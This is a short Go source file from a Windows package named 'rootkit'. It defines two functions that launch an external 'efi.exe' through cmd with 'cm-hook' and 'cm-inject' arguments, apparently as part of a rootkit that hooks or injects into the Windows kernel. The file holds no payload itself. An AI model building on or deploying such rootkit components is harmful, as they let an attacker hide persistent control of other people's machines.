//go:build windows

package rootkit

import (
"os/exec"
)

func CMHook() bool {
cmd := exec.Command("cmd", "/c", "efi.exe cm-hook")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func CMHookInject() bool {
cmd := exec.Command("cmd", "/c", "efi.exe cm-inject")
err := cmd.Run()
if err != nil {
return false
}
return true
}
